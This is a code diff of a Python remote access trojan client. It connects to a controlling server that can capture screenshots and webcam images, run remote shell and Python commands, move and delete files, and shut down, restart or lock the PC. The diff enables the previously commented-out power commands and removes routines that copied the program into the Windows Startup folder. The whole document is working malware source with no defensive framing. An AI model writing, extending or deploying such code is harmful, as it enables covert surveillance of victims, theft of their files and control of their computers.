@@ -1,4 +1,4 @@
-import socket, subprocess, os, platform, time, sys, pyscreeze, urllib.request, cv2, shutil
+import socket, subprocess, os, time, platform, sys, pyscreeze, urllib.request, cv2, shutil
 from io import StringIO
 
 # Socket Properties
@@ -35,26 +35,43 @@ def main():
 
 main()
 
+def recvall(buffer):
+    data = b""
+    while (len(data) < buffer):
+        data += recv(buffer)
+    return data
+
+def ClearFiles():
+    if (os.path.isfile(appdata+"/msg.vbs")):
+        os.remove(appdata+"/msg.vbs")
+    else: pass
+
+    if (os.path.isfile(appdata+"/screenshot.png")):
+        os.remove(appdata+"/screenshot.png")
+    else: pass
+
+    if (os.path.isfile(appdata+"/webcam.png")):
+        os.remove(appdata+"/webcam.png")
+    else: pass
+
 def MessageBox(message):
     with open(appdata+"/msg.vbs", "w") as VBS_MsgBox:
         VBS_MsgBox.write(f"MsgBox \"{message}\", 64, \"[Message]\""); VBS_MsgBox.close()
 
-    subprocess.Popen(["cscript.exe", appdata+"/msg.vbs"], shell=True)
-    send(b"(Message Sent)"); time.sleep(1); os.remove(appdata+"/msg.vbs")
+    subprocess.Popen(appdata+"/msg.vbs", shell=True)
+    send(b"(Message Sent)")
 
 def OpenWebpage(url):
     if (url == "append-connection"):
         return
 
-    subprocess.Popen("start " + url, shell=True); send(b"[Webpage Opened]")
+    subprocess.Popen("start " + url, shell=True); send(b"(Webpage Opened)")
 
 def Screenshot():
     try:
-        pyscreeze.screenshot(appdata+"/screenshot.png"); send(b"success"); time.sleep(1); send(str(os.path.getsize(appdata+"/screenshot.png")).encode()); time.sleep(0.2)
+        pyscreeze.screenshot(appdata+"/screenshot.png"); send(b"success"); time.sleep(0.2); send(str(os.path.getsize(appdata+"/screenshot.png")).encode())
         with open(appdata+"/screenshot.png", "rb") as ImageFile:
             send(ImageFile.read())
-
-        os.remove(appdata+"/screenshot.png")
     except:
         send(b"error")
 
@@ -63,13 +80,11 @@ def Webcam():
         webcam = cv2.VideoCapture(0)
         return_value, image = webcam.read()
         cv2.imwrite(appdata+"/webcam.png", image)
-        del(webcam); send(b"success"); time.sleep(0.5)
+        del(webcam); send(b"success")
 
-        send(str(os.path.getsize(appdata+"/webcam.png")).encode()); time.sleep(0.2)
+        send(str(os.path.getsize(appdata+"/webcam.png")).encode())
         with open(appdata+"/webcam.png", "rb") as ImageFile:
             send(ImageFile.read())
-
-        os.remove(appdata+"/webcam.png")
 
     except (cv2.error, Exception):
         send(b"error")
@@ -79,7 +94,7 @@ def StartProcess(process):
         send(b"INVALID")
         return
 
-    send(b"VALID"); os.system("start " + process)
+    send(b"VALID"); subprocess.Popen(process, shell=True)
 
 def PythonInterpreter():
     ServerCode = recv(1024).decode()
@@ -123,23 +138,6 @@ def RemoteCMD():
 
         send(OutputData)
 
-def RegisterStartup():
-    try:
-        shutil.copyfile(f"{__file__.split('.')[0]}.exe", f"C:/Users/{username}/AppData/Roaming/Microsoft/Windows/" + \
-                                f"Start Menu/Programs/Startup/{__file__.split('.')[0]}.exe")
-        send(b"(Registered to Startup)")
-    except (FileNotFoundError, OSError, Exception):
-        send(b"(Error Registering to Startup)")
-
-def RemoveStartup():
-    with open(appdata+"/del.vbs", "w") as DelFile:
-        DelFile.write("Set del = CreateObject(\"Scripting.FileSystemObject\")\ndel.DeleteFile(\""
-                       f"C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/{__file__.split('.')[0]}.exe\")")
-        DelFile.close()
-
-    subprocess.Popen(["cscript.exe", appdata+"/del.vbs"], shell=True)
-    send(b"(Removed from Startup)"); time.sleep(1); os.remove(appdata+"/del.vbs")
-
 def ViewFiles():
     drives = [chr(x) + ":/" for x in range(65,91) if os.path.isdir(chr(x) + ":/")]
     send(" ".join(drives).encode())
@@ -149,26 +147,32 @@ def ViewFiles():
         send(b"INVALID")
         return
 
-    send(b"VALID"); send(str(len(os.listdir(directory))).encode()); time.sleep(0.1); send("\n".join(os.listdir(directory)).encode())
+    Number_Of_Files = str(len(os.listdir(directory)))
+    buffersize = str(len("\n".join(os.listdir(directory))))
+    files = "\n".join(os.listdir(directory))
 
-def ReceiveFile(basename, bytesize):
-    with open(appdata+"/"+basename, "wb") as file:
-        file.write(recv(int(bytesize)))
+    send(b"VALID"); send(Number_Of_Files.encode()); time.sleep(0.2); send(buffersize.encode())
+    time.sleep(0.2); send(files.encode())
 
-    send(b"(File Sent)")
-
-def SendFile(file):
-    if not (os.path.isfile(file)):
+def SendFile(filepath):
+    if not (os.path.isfile(filepath)):
         send(b"error"); return
 
-    send(b"success"); send(os.path.basename(file).encode()); time.sleep(0.2); send(str(os.path.getsize(file)).encode())
-    with open(file, "rb") as file:
+    send(b"success"); time.sleep(0.2); send(os.path.basename(filepath).encode()); time.sleep(0.2); send(str(os.path.getsize(filepath)).encode())
+    with open(filepath, "rb") as file:
         send(file.read())
+
+def ReceiveFile(filename, buffersize):
+    with open(appdata+"/"+filename, "wb") as file:
+        file.write(recvall(buffersize))
+
+    send(b"(File Sent)")
 
 def Delete():
     ServerInput = recv(1024).decode()
     if (ServerInput == "del-file"):
         file = recv(1024).decode()
+
         if (os.path.isfile(file)):
             send(b"success"); os.remove(file)
         else:
@@ -188,9 +192,9 @@ while (True):
     try:
         ServerCommand = recv(1024).decode()
         if (ServerCommand == "close-connection"):
-            objSocket.close(); del(objSocket); break
+            ClearFiles(); objSocket.close(); del(objSocket); break
         elif (ServerCommand == "append-connection"):
-            objSocket.close(); del(objSocket); main()
+            ClearFiles(); objSocket.close(); del(objSocket); main()
         elif (ServerCommand == "test"):
             continue
         elif (ServerCommand == "message-box"):
@@ -207,24 +211,20 @@ while (True):
             PythonInterpreter()
         elif (ServerCommand == "remote-cmd"):
             RemoteCMD()
-        elif (ServerCommand == "startup"):
-            RegisterStartup()
-        elif (ServerCommand == "rmv-startup"):
-            RemoveStartup()
         elif (ServerCommand == "shutdown-pc"):
-            send(b"Powering Off"); # os.system("shutdown /p")
+            send(b"Powering Off"); subprocess.Popen("shutdown /p", shell=True)
         elif (ServerCommand == "restart-pc"):
-            send(b"Computer Restarting"); # os.system("shutdown /r")
+            send(b"Computer Restarting"); subprocess.Popen("shutdown /r", shell=True)
         elif (ServerCommand == "lock-pc"):
-            send(b"Computer Locked"); # os.system("rundll32.exe user32.dll,LockWorkStation")
+            send(b"Computer Locked"); subprocess.Popen("rundll32.exe user32.dll,LockWorkStation", shell=True)
         elif (ServerCommand == "current-dir"):
             send(os.getcwd().encode());
         elif (ServerCommand == "view-files"):
             ViewFiles()
-        elif (ServerCommand == "send-file"):
-            ReceiveFile(basename=recv(1024).decode(), bytesize=recv(1024).decode())
         elif (ServerCommand == "receive-file"):
-            SendFile(file=recv(1024).decode())
+            SendFile(filepath=recv(1024).decode())
+        elif (ServerCommand == "send-file"):
+            ReceiveFile(filename=recv(1024).decode(), buffersize=int(recv(1024).decode()))
         elif (ServerCommand == "delete"):
             Delete()
 
